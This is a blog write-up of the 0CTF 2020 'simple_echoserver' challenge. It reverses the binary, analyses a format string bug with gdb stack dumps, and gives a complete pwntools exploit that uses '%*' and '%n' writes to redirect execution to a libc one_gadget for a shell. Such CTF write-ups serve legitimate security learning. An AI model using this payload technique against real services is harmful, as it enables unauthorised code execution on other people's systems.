<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Writeup for Simple Echo Server 0ctf 2020
        
    </title><meta content="Writeup for Simple Echo Server 0ctf 2020" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/simple-echoserver/&t=Writeup for Simple Echo Server 0ctf 2020"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Writeup for Simple Echo Server 0ctf 2020<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-07-02</time></div></div><section class=body><p>We had great time playing this year's edition of 0CTF 2020. I was mostly working on the challenge <strong>simple_echoserver</strong> which was a fairly simple stack based challenge, but required lot of brute forcing. Sadly , we couldn't hit the bruteforce on server. Nevertheless , here's the intended solution for the challenge.<h2 id=tl-dr-of-the-challenge-binary>TL;DR OF THE CHALLENGE BINARY</h2><p>We've been provided with standard <em>x86 64-bit Dynamically Linked</em> binary along with <em>glibc 2.27</em> to start with.<p>Here's what <strong>checksec</strong> has to say -<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>CANARY    </span><span style=color:#bfbab0cc>: </span><span>ENABLED
</span><span>FORTIFY   </span><span style=color:#bfbab0cc>: </span><span>disabled
</span><span>NX        </span><span style=color:#bfbab0cc>: </span><span>ENABLED
</span><span>PIE       </span><span style=color:#bfbab0cc>: </span><span>ENABLED
</span><span>RELRO     </span><span style=color:#bfbab0cc>: </span><span>FULL
</span></code></pre><p>Let's reverse this now.<h2 id=reversing>REVERSING</h2><p>The binary is a fairly simple one asking us for <strong>name</strong> and <strong>phone number</strong> which it stores on stack and then performs <strong>fprintf</strong> of name through stderr. An important thing to note is that <em>stderr is being directed to /dev/null</em> on server and hence the binary won't print out name , thereby preventing leaks.<p>The bug lies in the fprintf where we encounter the infamous <strong>Format String Vulnerability</strong>.<p>The function asking for Details -><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span> </span><span style=color:#ffb454>puts</span><span>(</span><span style=color:#c2d94c>"For audit, please provide your name and phone number: "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"Your name: "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>read_name</span><span>((_BYTE </span><span style=color:#f29668>*</span><span>)a1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>256</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"Your phone: "</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>256</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  result </span><span style=color:#f29668>= </span><span style=color:#ffb454>read_num</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f29668>*</span><span>(_QWORD </span><span style=color:#f29668>*</span><span>)(a1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>256</span><span>) </span><span style=color:#f29668>=</span><span> result</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>return</span><span> result</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><p>This is the function which contains our vulnerable fprintf<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span> </span><span style=color:#ffb454>snprintf</span><span>((</span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f29718>0x555555558060</span><span style=color:#ff7733>LL</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x100</span><span style=color:#ff7733>uLL</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>"[USER] name: </span><span style=color:#f29718>%s</span><span style=color:#c2d94c>; phone: </span><span style=color:#f29718>%ld</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> a1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>*</span><span>(_QWORD </span><span style=color:#f29668>*</span><span>)(a1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>256</span><span>))</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>return </span><span style=color:#f07178>fprintf</span><span>(MEMORY[</span><span style=color:#f29718>0x555555558040</span><span>]</span><span style=color:#bfbab0cc>, </span><span>(</span><span style=color:#ff7733>const char </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f29718>0x555555558060</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>;
</span></code></pre><p>After this , the program loops and echo's whatever we give as input without any vulnerabilities.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>    </span><span style=color:#ffb454>puts</span><span>(</span><span style=color:#c2d94c>"Now enjoy yourself"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>while</span><span>(</span><span style=color:#f29718>1</span><span>)
</span><span>    {
</span><span>        </span><span style=color:#ffb454>read_name</span><span>(</span><span style=color:#f29668>&</span><span>s1</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>256</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f29668>!</span><span style=color:#f07178>strcmp</span><span>(</span><span style=color:#f29668>&</span><span>s1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"~."</span><span>))
</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#f29718>%s</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>&</span><span>s1)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span></code></pre><h2 id=exploit-idea-and-analysis>EXPLOIT IDEA AND ANALYSIS</h2><p>Well , initially we planned to do File Structure overwrite by corrupting stderr's <em>file_no</em> field with <strong>1</strong> and calling main again would print leaks. But that method looked very cumbersome as it required lots of bruteforcing.<p>Hence the intended solution is to pop pyell leaklessly.<p>Let us notice stack at the instance of calling vulnerable printf.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span style=color:#f29718>0000</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffebf8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x55555555541a </span><span>(nop)
</span><span style=color:#f29718>000</span><span>8</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec00 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x0 
</span><span style=color:#f29718>0016</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec08 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x555555558160 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x6161616161 </span><span>(</span><span style=color:#c2d94c>'aaaaa'</span><span>) </span><span style=color:#f29668>-></span><span>Input
</span><span style=color:#f29718>0024</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec10 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed30 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed50 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x5555555554e0 </span><span>(endbr64) </span><span style=color:#f29668>-></span><span>Main</span><span style=color:#c2d94c>'s RBP
</span><span style=color:#f29718>0032</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec18 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x555555555443 </span><span>(lea    rdi</span><span style=color:#bfbab0cc>,</span><span>[rip</span><span style=color:#f29668>+</span><span style=color:#f29718>0xc5b</span><span>]        </span><span style=font-style:italic;color:#5c6773># 0x5555555560a5)
</span><span style=color:#f29718>0040</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec20 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x0 
</span><span style=color:#f29718>004</span><span>8</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec28 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x0 
</span><span style=color:#f29718>0056</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec30 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed30 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed50 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x5555555554e0 </span><span>(endbr64)
</span><span style=color:#f29718>0064</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec38 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7ffff7dcfa00 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0xfbad208b 
</span><span style=color:#f29718>0072</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec40 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0xd68 </span><span>(</span><span style=color:#c2d94c>'h</span><span style=color:#95e6cb>\r</span><span style=color:#c2d94c>'</span><span>)
</span><span style=color:#f29718>00</span><span>80</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec48 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7ffff7a71148 </span><span>(</span><span style=color:#f29668><</span><span>_IO_file_underflow</span><span style=color:#f29668>+</span><span style=color:#f29718>296</span><span style=color:#f29668>></span><span>:	test   rax</span><span style=color:#bfbab0cc>,</span><span>rax)
</span><span style=color:#f29718>00</span><span>88</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec50 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0xf705fa00 
</span><span style=color:#f29718>00</span><span>96</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec58 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0xffffffffffffffff 
</span><span style=color:#f29718>0104</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec60 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x5555555550f0 </span><span>(endbr64)
</span><span style=color:#f29718>0112</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec68 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0xa </span><span>(</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span>)
</span><span style=color:#f29718>0120</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec70 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed10 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed30 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed50 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x5555555554e0 </span><span>(endbr64)
</span><span style=color:#f29718>012</span><span>8</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec78 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x5555555550f0 </span><span>(endbr64)
</span><span style=color:#f29718>0136</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec80 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffee30 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x1 
</span><span style=color:#f29718>0144</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec88 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x0 
</span><span style=color:#f29718>0152</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec90 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x0 
</span><span style=color:#f29718>0160</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffec98 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x555555555348 </span><span>(mov    rcx</span><span style=color:#bfbab0cc>,</span><span>QWORD PTR [rbp</span><span style=color:#f29668>-</span><span style=color:#f29718>0x18</span><span>])
</span><span style=color:#f29718>016</span><span>8</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffeca0 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7ffff7dcfa00 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0xfbad208b 
</span><span style=color:#f29718>0176</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffeca8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffecb3 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0xffee300000000000 
</span><span style=color:#f29718>01</span><span>84</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecb0 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x333231 </span><span>(</span><span style=color:#c2d94c>'123'</span><span>) </span><span style=color:#f29668>-> </span><span>Phone Number
</span><span style=color:#f29718>01</span><span>92</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecb8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffee30 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x1 
</span><span>
</span><span style=color:#f29718>020</span><span>8</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecc8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7ffff7a723f2 </span><span>(</span><span style=color:#f29668><</span><span>_IO_default_uflow</span><span style=color:#f29668>+</span><span style=color:#f29718>50</span><span style=color:#f29668>></span><span>:	</span><span style=color:#f07178>cmp    </span><span>eax</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0xffffffff</span><span>)
</span><span style=color:#f29718>0216</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecd0 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x36 </span><span>(</span><span style=color:#c2d94c>'6'</span><span>)
</span><span style=color:#f29718>0224</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecd8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x555555558165 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x0 
</span><span style=color:#f29718>0232</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffece0 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed10 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed30 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffed50 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x5555555554e0 </span><span>(endbr64)
</span><span style=color:#f29718>0240</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffece8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x55555555528d </span><span>(mov    r12d</span><span style=color:#bfbab0cc>,</span><span>eax)
</span><span style=color:#f29718>024</span><span>8</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecf0 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x10055556029 
</span><span>
</span><span>
</span><span>
</span></code></pre><p>If we close analyse address <strong>0x7fffffffeca8</strong> which also contains a stack pointer <strong>0x7fffffffecb3</strong>, we see that we can control it with the Phone Number that we give as input , so if we give the phone number of <em>length</em> <strong>24</strong> , then we can make that pointer point to a libc address.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#f29718>0176</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffeca8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7fffffffecc8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7ffff7a72300 </span><span>(</span><span style=color:#f29668><</span><span>_IO_doallocbuf</span><span style=color:#f29668>></span><span>:	</span><span style=color:#f07178>cmp    </span><span>QWORD PTR [rdi</span><span style=color:#f29668>+</span><span style=color:#f29718>0x38</span><span>]</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x0</span><span>)
</span><span style=color:#f29718>01</span><span>84</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecb0 </span><span>(</span><span style=color:#c2d94c>'0' </span><span style=color:#f29668><</span><span>repeats </span><span style=color:#f29718>24 </span><span>times</span><span style=color:#f29668>></span><span>) </span><span style=color:#f29668>-> </span><span>Phone Number of length </span><span style=color:#f29718>24
</span><span style=color:#f29718>01</span><span>92</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecb8 </span><span>(</span><span style=color:#c2d94c>'0' </span><span style=color:#f29668><</span><span>repeats </span><span style=color:#f29718>16 </span><span>times</span><span style=color:#f29668>></span><span>)
</span><span style=color:#f29718>0200</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecc0 </span><span>(</span><span style=color:#c2d94c>"00000000"</span><span>)
</span><span style=color:#f29718>020</span><span>8</span><span style=color:#f29668>| </span><span style=color:#f29718>0x7fffffffecc8 </span><span style=color:#f29668>--> </span><span style=color:#f29718>0x7ffff7a72300 </span><span>(</span><span style=color:#f29668><</span><span>_IO_doallocbuf</span><span style=color:#f29668>></span><span>:	</span><span style=color:#f07178>cmp    </span><span>QWORD PTR [rdi</span><span style=color:#f29668>+</span><span style=color:#f29718>0x38</span><span>]</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x0</span><span>)
</span><span>
</span></code></pre><p>Now that we have a libc address , we now corrupt it to point to one_gadget and pivot stack by corrupting rbp to point to one_gadget to grant us shell.<p>After a few attempts , <strong>0xe5863</strong> magic address satisfies and we get shell.<p>But how do we write one_gadget number of bytes to that address?<p>We can use <code>%*</code> format string which is actually used for picking arguments from stack.<p>If we can pick arguments from stack , we can add them to constant numbers and get to one_gadget. {: .notice}<p>So now the plan is ,<ol><li>Corrupt rbp to point to our supposed one_gadget.<li>Find the difference between the libc address on stack and one_gadget. This is the number of bytes we need to add to our libc address which we will do with <code>%*</code>.<li>We calculate the offset and number of bytes to be added and finally use %n to store the result of addition back in the pointer we have to corrupt.</ol><p>Here's the exploit script.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span style=color:#ff7733>import </span><span>sys
</span><span>
</span><span>HOST </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'pwnable.org'
</span><span>PORT </span><span style=color:#f29668>= </span><span style=color:#f29718>12020
</span><span>LIBC </span><span style=color:#f29668>= </span><span style=color:#ffb454>ELF</span><span>(</span><span style=color:#c2d94c>"./libc.so.6"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>checksec </span><span style=color:#f29668>= </span><span style=color:#f29718>False</span><span>)
</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(HOST</span><span style=color:#bfbab0cc>,</span><span>PORT)
</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
</span><span style=color:#ff7733>else</span><span>:
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>'./simple_echoserver'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>}</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>stderr </span><span style=color:#f29668>= </span><span style=color:#f07178>open</span><span>(</span><span style=color:#c2d94c>'/dev/null'</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'w+'</span><span>))
</span><span>
</span><span>reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
</span><span>sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
</span><span>sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
</span><span>rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
</span><span>sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
</span><span>re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
</span><span>s </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(a)
</span><span style=font-style:italic;color:#5c6773>#b*0x5555555554d0
</span><span>
</span><span style=font-style:italic;color:#5c6773>#'%*76$d' + '%73$n')
</span><span>
</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"""
</span><span style=color:#c2d94c>            b fprintf
</span><span style=color:#c2d94c>            c
</span><span style=color:#c2d94c>            """</span><span>)
</span><span>    </span><span style=font-style:italic;color:#5c6773>#rbp is stored at 7th offset , the libc address is stored at offset 30 and the pointer to libc address is stored at 26th offset
</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"Your name: "</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>'</span><span style=color:#f29718>%3c</span><span style=color:#c2d94c>' </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'%7$hhn' </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#f29718>%357715c</span><span style=color:#c2d94c>' </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'%*30$c' </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'%26$n'</span><span>)
</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'phone: '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'0'</span><span style=color:#f29668>*</span><span style=color:#f29718>24</span><span>) </span><span style=font-style:italic;color:#5c6773>#To get pointer to libc address
</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'yourself!</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
</span><span>    </span><span style=color:#ffb454>sl</span><span>(</span><span style=color:#c2d94c>'~.'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
</span></code></pre><h2 id=conclusion>CONCLUSION</h2><p>The challenge has unintended solutions which deal with exploiting <strong>vfprintf</strong> which Ill not be looking into as for now.<p>Simple challenge with complex tricks , kudos to 0CTF for such a challenge.</section></article></main></div>